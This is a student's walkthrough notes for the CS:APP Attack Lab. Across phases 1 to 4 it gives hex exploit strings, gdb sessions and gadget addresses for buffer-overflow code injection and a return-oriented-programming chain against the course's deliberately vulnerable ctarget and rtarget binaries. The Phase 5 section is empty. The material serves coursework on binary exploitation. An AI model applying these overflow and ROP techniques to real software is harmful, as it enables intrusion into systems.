Attack lab:
ssh jieyun@lnxsrv09.seas.ucla.edu
cd target164
// My Cookie for later reference: 0x4e99cb1b
objdump -d ctarget
// copy all the assembly code into a Google docs file
objdump -d rtarget
// copy all the assembly code into a Google docs file

Cyberduck: click “Open Connection”, select “SFTP”, type “lnxsrv.seas.ucla.edu” for Server, and my username and password, and click connect.

[jieyun@lnxsrv09 ~/target164]$ chmod +x ctarget // since permission was denied the first time I ran ctarget
[jieyun@lnxsrv09 ~/target164]$ chmod +x rtarget
[jieyun@lnxsrv09 ~/target164]$ chmod +x hex2raw
[jieyun@lnxsrv09 ~/target164]$ chmod +x farm.c
[jieyun@lnxsrv09 ~/target164]$ chmod +x cookie.txt
[jieyun@lnxsrv09 ~/target164]$ chmod +x README.txt

gdb ctarget



////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                              Phase 1                                               //
////////////////////////////////////////////////////////////////////////////////////////////////////////

// Need to redirect the program to execute an existing procedure.
// More specifically, make the getbuf function to execute the touch1 function, 
// when getbuf reaches its return statement,
// instead of returning back to the test function.

(gdb) run
Type string:asdf
No exploit.  Getbuf returned 0x1
Normal return
[Inferior 1 (process 1746) exited normally]
// Need to use an exploit string.

(gdb) b getbuf
Breakpoint 1 at 0x401757: file buf.c, line 12.

(gdb) run
Starting program: /w/home.05/ee/ugrad/jieyun/target164/ctarget 
Cookie: 0x4e99cb1b

Breakpoint 1, getbuf () at buf.c:12
12	buf.c: No such file or directory.
Missing separate debuginfos, use: debuginfo-install glibc-2.17-196.el7_4.2.x86_64

(gdb) disas
Dump of assembler code for function getbuf:
=> 0x0000000000401757 <+0>:	sub    $0x38,%rsp
   0x000000000040175b <+4>:	mov    %rsp,%rdi
   0x000000000040175e <+7>:	callq  0x40199a <Gets>
   0x0000000000401763 <+12>:	mov    $0x1,%eax
   0x0000000000401768 <+17>:	add    $0x38,%rsp
   0x000000000040176c <+21>:	retq   
End of assembler dump.

// 0x38 is 56 bytes of buffer located for getbuf
// put 56 bytes of padding and then the return address of touch1

// In my objdump for rtarget, touch1 has the assembly code:
000000000040176d <touch1>:
  40176d:	48 83 ec 08          	sub    $0x8,%rsp
  401771:	c7 05 81 3d 20 00 01 	movl   $0x1,0x203d81(%rip)        # 6054fc <vlevel>
  401778:	00 00 00 
  40177b:	bf 22 30 40 00       	mov    $0x403022,%edi
  401780:	e8 cb f4 ff ff       	callq  400c50 <puts@plt>
  401785:	bf 01 00 00 00       	mov    $0x1,%edi
  40178a:	e8 1a 05 00 00       	callq  401ca9 <validate>
  40178f:	bf 00 00 00 00       	mov    $0x0,%edi
  401794:	e8 57 f6 ff ff       	callq  400df0 <exit@plt>

// The address of the touch1 function is 0x000000000040176d
// So the answer for this phase is:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 // 56 bytes of padding
6d 17 40 00 00 00 00 00 // address of touch1 function in little endian

quit // quit gdb

[jieyun@lnxsrv09 ~/target164]$ ./hex2raw <phase1.txt> raw-phase1.txt
[jieyun@lnxsrv09 ~/target164]$ ./ctarget < raw-phase1.txt
Cookie: 0x4e99cb1b
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!



////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                              Phase 2                                               //
////////////////////////////////////////////////////////////////////////////////////////////////////////

// Need to inject a string so that ctarget would execute the touch2 code instead of returning to test
// Make it appear to touch2 as if I’m passing my cookie (0x4e99cb1b) as the argument
// the first argument to a function is passed in register %rdi
// Store the cookie in the %rdi

// Make a phase2.s file to save the cookie to my rdi register and return. 
// phase2.s includes these 2 lines:
movq $0x4e99cb1b,%rdi
retq

// To get the byte representation of my phase2.s code,
// compile the phase2.s file with gcc and then disassemble it in objdump
[jieyun@lnxsrv09 ~/target164]$ gcc -c phase2.s
[jieyun@lnxsrv09 ~/target164]$ objdump -d phase2.o > phase2.d

// My phase2.d file contains this:
phase2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 1b cb 99 4e 	mov    $0x4e99cb1b,%rdi
   7:	c3                   	retq   

// So the byte representation of the assembly code for returning my cookie is “48 c7 c7 1b cb 99 4e c3”
// This should be the first line of phase2.txt file
// Now I need to see how much padding to use, and then the address of %rsp, and then the address of the touch2 function.

(gdb) b getbuf
Breakpoint 1 at 0x401757: file buf.c, line 12.
(gdb) run
Starting program: /w/home.05/ee/ugrad/jieyun/target164/ctarget 
Cookie: 0x4e99cb1b

Breakpoint 1, getbuf () at buf.c:12
12	buf.c: No such file or directory.
Missing separate debuginfos, use: debuginfo-install glibc-2.17-196.el7_4.2.x86_64
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x0000000000401757 <+0>:	sub    $0x38,%rsp          // my buffer has 0x38 = 56 bytes of padding, just like it was in phase 1
   0x000000000040175b <+4>:	mov    %rsp,%idi
   0x000000000040175e <+7>:	callq  0x40199a <Gets>
   0x0000000000401763 <+12>:	mov    $0x1,%eax           // stop here to see when %rsp is after Gets function was called
   0x0000000000401768 <+17>:	add    $0x38,%rsp
   0x000000000040176c <+21>:	retq   
End of assembler dump.

(gdb) until *0x401763
Type string:asdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjkl
getbuf () at buf.c:16
16	in buf.c
// I typed a string that’s more than 56 characters

(gdb) x/s $rsp
0x556841c8:	"asdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjkl"

// This is the address that should be placed into little endian to get “c8 41 68 55 00 00 00 00”

// In my rtarget assembly code, my touch2 function looks like:
0000000000401799 <touch2>:
  401799:	48 83 ec 08          	sub    $0x8,%rsp
  40179d:	89 fe                	mov    %edi,%esi
  40179f:	c7 05 53 3d 20 00 02 	movl   $0x2,0x203d53(%rip)        # 6054fc <vlevel>
  4017a6:	00 00 00 
  4017a9:	3b 3d 55 3d 20 00    	cmp    0x203d55(%rip),%edi        # 605504 <cookie>
  4017af:	75 1b                	jne    4017cc <touch2+0x33>
  4017b1:	bf 48 30 40 00       	mov    $0x403048,%edi
  4017b6:	b8 00 00 00 00       	mov    $0x0,%eax
  4017bb:	e8 c0 f4 ff ff       	callq  400c80 <printf@plt>
  4017c0:	bf 02 00 00 00       	mov    $0x2,%edi
  4017c5:	e8 df 04 00 00       	callq  401ca9 <validate>
  4017ca:	eb 19                	jmp    4017e5 <touch2+0x4c>
  4017cc:	bf 70 30 40 00       	mov    $0x403070,%edi
  4017d1:	b8 00 00 00 00       	mov    $0x0,%eax
  4017d6:	e8 a5 f4 ff ff       	callq  400c80 <printf@plt>
  4017db:	bf 02 00 00 00       	mov    $0x2,%edi
  4017e0:	e8 76 05 00 00       	callq  401d5b <fail>
  4017e5:	bf 00 00 00 00       	mov    $0x0,%edi
  4017ea:	e8 01 f6 ff ff       	callq  400df0 <exit@plt>

// My touch2 function address is at 0000000000401799, which in little endian is “99 17 40 00 00 00 00 00”

// So to conclude, my phase2.txt should include:
48 c7 c7 1b cb 99 4e c3 // return a cookie
00 00 00 00 00 00 00 00 // 56 bytes of padding
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c8 41 68 55 00 00 00 00 // %rsp address
99 17 40 00 00 00 00 00 // touch2 function address

quit gdb
save my phase2.txt file on Cyberduck
run through hex2raw
run ctarget with the phase2.txt string

[jieyun@lnxsrv09 ~/target164]$ ./hex2raw <phase2.txt> raw-phase2.txt
[jieyun@lnxsrv09 ~/target164]$ ./ctarget < raw-phase2.txt
Cookie: 0x4e99cb1b
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
FAILED

// Turns out that my padding was incorrect. Delete one line of padding.
// So to conclude, my phase2.txt should include:
48 c7 c7 1b cb 99 4e c3 // return a cookie
00 00 00 00 00 00 00 00 // 56 bytes in total, including the cookie line already
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c8 41 68 55 00 00 00 00 // %rsp address
99 17 40 00 00 00 00 00 // touch2 function address

[jieyun@lnxsrv09 ~/target164]$ ./hex2raw <phase2.txt> raw-phase2.txt
[jieyun@lnxsrv09 ~/target164]$ ./ctarget < raw-phase2.txt
Cookie: 0x4e99cb1b
Type string:Touch2!: You called touch2(0x4e99cb1b)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!



////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                              Phase 3                                               //
////////////////////////////////////////////////////////////////////////////////////////////////////////

// In rtarget, my touch3 assembly code looks like this:
000000000040186d <touch3>:
  40186d:	53                   	push   %rbx
  40186e:	48 89 fb             	mov    %rdi,%rbx
  401871:	c7 05 81 3c 20 00 03 	movl   $0x3,0x203c81(%rip)        # 6054fc <vlevel>
  401878:	00 00 00 
  40187b:	48 89 fe             	mov    %rdi,%rsi
  40187e:	8b 3d 80 3c 20 00    	mov    0x203c80(%rip),%edi        # 605504 <cookie>
  401884:	e8 66 ff ff ff       	callq  4017ef <hexmatch>
  401889:	85 c0                	test   %eax,%eax
  40188b:	74 1e                	je     4018ab <touch3+0x3e>
  40188d:	48 89 de             	mov    %rbx,%rsi
  401890:	bf 98 30 40 00       	mov    $0x403098,%edi
  401895:	b8 00 00 00 00       	mov    $0x0,%eax
  40189a:	e8 e1 f3 ff ff       	callq  400c80 <printf@plt>
  40189f:	bf 03 00 00 00       	mov    $0x3,%edi
  4018a4:	e8 00 04 00 00       	callq  401ca9 <validate>
  4018a9:	eb 1c                	jmp    4018c7 <touch3+0x5a>
  4018ab:	48 89 de             	mov    %rbx,%rsi
  4018ae:	bf c0 30 40 00       	mov    $0x4030c0,%edi
  4018b3:	b8 00 00 00 00       	mov    $0x0,%eax
  4018b8:	e8 c3 f3 ff ff       	callq  400c80 <printf@plt>
  4018bd:	bf 03 00 00 00       	mov    $0x3,%edi
  4018c2:	e8 94 04 00 00       	callq  401d5b <fail>
  4018c7:	bf 00 00 00 00       	mov    $0x0,%edi
  4018cc:	e8 1f f5 ff ff       	callq  400df0 <exit@plt>
// My touch3 function address is: 000000000040186d
// In little endian, this is “6d 18 40 00 00 00 00 00”

// In phase2, my %rsp address was 0x556841c8 + buffer 0x38 + %rsp return address 8 bytes + touch3 address 8 bytes = 1432895944 + 56 + 8 + 8 = 1432896016 = 0x55684210
// Make a phase3.s file that includes:
movq $0x55684210,%rdi
retq

[jieyun@lnxsrv09 ~/target164]$ gcc -c phase3.s
[jieyun@lnxsrv09 ~/target164]$ objdump -d phase3.o > phase3.d

// Download phase3.d from my Cyberduck. Open with Atom, phase3.d includes:
phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 10 42 68 55 	mov    $0x55684210,%rdi
   7:	c3                   	retq   

// My cookie is “0x4e99cb1b”, which is equivalent to “34 65 39 39 63 62 31 62” in text format.

48 c7 c7 10 42 68 55 c3 // return a cookie
00 00 00 00 00 00 00 00 // 56 bytes of padding in total, including cookie padding
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c8 41 68 55 00 00 00 00 // %rsp address???
6d 18 40 00 00 00 00 00 // touch3 function address
34 65 39 39 63 62 31 62 // cookie in text format, instead of hex

[jieyun@lnxsrv09 ~/target164]$ ./hex2raw < phase3.txt > raw-phase3.txt
[jieyun@lnxsrv09 ~/target164]$ ./ctarget < raw-phase3.txt
Cookie: 0x4e99cb1b
Type string:Touch3!: You called touch3("4e99cb1b")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!



////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                              Phase 4                                               //
////////////////////////////////////////////////////////////////////////////////////////////////////////

// According to the spec, “All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm.”
// The key is to send my cookie into touch2 function. The easiest way to do so is to store my cookie into %rsp and then pop it. The byte representation for “popq %rdi” is “5f”. 

// Try to do an exploit as follows:
popq %rax         // Byte representation: “58”
movq %rax %rdi    // Byte representation: “48 89 c7”
ret               // Byte representation: “c3”

00000000004018f5 <start_farm>:
  4018f5:	b8 01 00 00 00       	mov    $0x1,%eax
  4018fa:	c3                   	retq   

00000000004018fb <addval_432>:
  4018fb:	8d 87 48 89 c7 c7    	lea    -0x383876b8(%rdi),%eax
  401901:	c3                   	retq   

0000000000401902 <addval_153>:
  401902:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  401908:	c3                   	retq   

0000000000401909 <addval_366>:
  401909:	8d 87 c1 58 90 c3    	lea    -0x3c6fa73f(%rdi),%eax     // contains the byte representation “58”

  40190f:	c3                   	retq   

0000000000401910 <getval_307>:
  401910:	b8 c7 58 90 c3       	mov    $0xc39058c7,%eax
  401915:	c3                   	retq   

0000000000401916 <setval_359>:
  401916:	c7 07 48 89 c7 c1    	movl   $0xc1c78948,(%rdi)
  40191c:	c3                   	retq   

000000000040191d <setval_468>:
  40191d:	c7 07 48 90 90 c3    	movl   $0xc3909048,(%rdi)
  401923:	c3                   	retq   

0000000000401924 <addval_145>:
  401924:	8d 87 45 58 94 90    	lea    -0x6f6ba7bb(%rdi),%eax
  40192a:	c3                   	retq   

000000000040192b <addval_406>:
  40192b:	8d 87 26 48 89 c7    	lea    -0x3876b7da(%rdi),%eax     // contains “48 89 c7”
  401931:	c3                   	retq   

0000000000401932 <mid_farm>:

// For the first gadget, the address for “58” is at address 0x401910 + 2 bytes = 0x401912, which is “12 19 40” in little endian.
  401910:	b8 c7 58 90 c3       	mov    $0xc39058c7,%eax
  401915:	c3                   	retq   

// For the second gadget, the address for “48 89 c7 c3” starts at address 0x40192b + 3 bytes = 0x40192e, which is “2e 19 40” in little endian.
000000000040192b <addval_406>:
  40192b:	8d 87 26 48 89 c7    	lea    -0x3876b7da(%rdi),%eax
  401931:	c3                   	retq   

// My cookie is 0x4e99cb1b, which is “1b cb 99 4e” in little endian.

// The exploit string should be:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 // 56 bytes of padding
12 19 40 00 00 00 00 00 // first gadget
1b cb 99 4e 00 00 00 00 // my cookie
2e 19 40 00 00 00 00 00 // second gadget
99 17 40 00 00 00 00 00 // touch2 function address

In fact, there are many possibilities that MAY be able to work, so I tested all of them out of curiosity.
gadget 1 can be:
401909 + 3 = 40190c // worked
401910 + 2 = 401912 // worked
401924 + 3 = 401927 // Segmentation fault

gadget 2 can be:
4018fb + 2 = 4018fd // Ouch!: You caused a segmentation fault!
401902 + 2 = 401904 // worked
401916 + 2 = 401918 // Oops!: You executed an illegal instruction
40192b + 3 = 40192e // worked

[jieyun@lnxsrv09 ~/target164]$ ./hex2raw < phase4.txt > raw-phase4.txt
[jieyun@lnxsrv09 ~/target164]$ ./rtarget < raw-phase4.txt
// note that this should be rtarget, not target now

Cookie: 0x4e99cb1b
Type string:Touch2!: You called touch2(0x4e99cb1b)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!



////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                              Phase 5                                               //
////////////////////////////////////////////////////////////////////////////////////////////////////////


